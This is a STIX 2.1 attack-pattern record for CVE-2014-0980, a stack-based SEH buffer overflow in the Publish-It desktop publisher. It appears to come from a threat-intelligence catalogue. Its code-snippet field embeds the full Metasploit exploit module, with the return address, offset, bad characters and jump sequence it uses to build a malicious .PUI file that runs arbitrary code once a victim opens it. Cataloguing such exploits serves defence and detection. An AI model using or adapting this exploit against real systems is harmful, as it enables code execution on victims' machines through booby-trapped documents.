{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3c962433-8415-4ba2-9620-640edf906683",
    "created": "2024-08-14T16:35:57.383504Z",
    "modified": "2024-08-14T16:35:57.383507Z",
    "name": "Publish-It PUI Buffer Overflow (SEH)",
    "description": " This module exploits a stack based buffer overflow in Publish-It when processing a specially crafted .PUI file. This vulnerability could be exploited by a remote attacker to execute arbitrary code on the target machine by enticing a user of Publish-It to open a malicious .PUI file.  'License'    => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/publishit_pui.rb",
            "external_id": "publishit_pui.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0980"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'    => 'Publish-It PUI Buffer Overflow (SEH)',\n      'Description'  => %q{\n          This module exploits a stack based buffer overflow in Publish-It when\n          processing a specially crafted .PUI file. This vulnerability could be\n          exploited by a remote attacker to execute arbitrary code on the target\n          machine by enticing a user of Publish-It to open a malicious .PUI file.\n      },\n      'License'    => MSF_LICENSE,\n      'Author'    =>\n        [\n          'Daniel Kazimirow',  # Original discovery\n          'Andrew Smith \"jakx_\"',  # Exploit and MSF Module\n        ],\n      'References'  =>\n        [\n          [ 'OSVDB', '102911' ],\n          [ 'CVE', '2014-0980' ],\n          [ 'EDB', '31461' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process'\n        },\n      'Platform'  => 'win',\n      'Payload'  =>\n        {\n          'BadChars' => \"\\x00\\x0b\\x0a\",\n          'DisableNops' => true,\n          'Space' => 377\n        },\n      'Targets'    =>\n        [\n          [ 'Publish-It 3.6d',\n            {\n              'Ret'     =>  0x0046e95a, #p/p/r | Publish.EXE\n              'Offset'  =>  1082\n            }\n          ],\n        ],\n      'Privileged'  => false,\n      'DisclosureDate'  => '2014-02-05',\n      'DefaultTarget'  => 0))\n\n    register_options([OptString.new('FILENAME', [ true, 'The file name.', 'msf.pui']),])\n\n  end\n\n  def exploit\n\n    path = ::File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2014-0980.pui\")\n    fd = File.open(path, \"rb\")\n    template_data = fd.read(fd.stat.size)\n    fd.close\n\n    buffer = template_data\n    buffer << make_nops(700)\n    buffer << payload.encoded\n    buffer << make_nops(target['Offset']-payload.encoded.length-700-5)\n    buffer << Rex::Arch::X86.jmp('$-399') #long negative jump -399\n    buffer << Rex::Arch::X86.jmp_short('$-24') #nseh negative jump\n    buffer << make_nops(2)\n    buffer << [target.ret].pack(\"V\")\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(buffer)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-02-05",
    "x_mitre_platforms": [
        "win'"
    ]
}